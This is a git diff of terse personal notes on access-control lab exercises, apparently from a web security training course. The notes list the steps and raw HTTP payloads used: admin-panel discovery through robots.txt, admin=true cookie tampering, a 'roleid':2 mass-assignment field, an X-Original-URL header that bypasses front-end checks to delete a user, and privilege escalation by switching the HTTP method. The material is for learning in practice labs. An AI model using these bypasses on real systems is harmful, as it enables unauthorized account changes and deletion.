@@ -11,11 +11,11 @@ unprotected funcs:
 -a user can browse to: https://insecure-website.com/admin
 -can find an admin url link within that page https://insecure-website.com/robots.txt
 
-lab1: 
+-----------lab1:----------- 
 -dockerimageurl.com/robots.txt
 -dockerimageurl.com/adminstrator-panel
 -delete user.
-lab2:
+----------lab2:------------
 -view sloc (r.clik)
 -ctrl.F + 'admin'
 -e.g:
@@ -29,10 +29,10 @@ if (isAdmin) {
    topLinksTag.append(' |');
    
    
- lab3:
+ ----------lab3:-----------
  burp>proxy>admin=true
  
- lab4:
+ ----------lab4:------------
  burp>proxy/intercept
  lab>my-account
  send email request to burp repeater>
@@ -40,7 +40,7 @@ if (isAdmin) {
  {"email":"test", "roleid":2}
  
  
- lab5:
+ ----------lab5:------------
  lab>click admin panel>send request to burp proxy
 POST / HTTP/1.1
 X-Original-URL: /admin/
@@ -51,3 +51,16 @@ X-Original-URL: /admin/delete
 oneshot:
 GET /?username=carlos HTTP/1.1
 X-Original-URL: /admin/delete
+
+-----------lab6:------------
+login w admin creds,
+admin panel>promote carlos (send request to burp.rptr)
+open new incog window, 
+login w non-admin (record cookie)
+go to burp.rptr > paste in non-admins cookie in carlos cookie
+--obsrv 'unauth' error
+change method from POST to POSTX
+--obsrv 'missng param' error
+r.clk 'change req method'
+change uname param to non-admin cred
+resend request
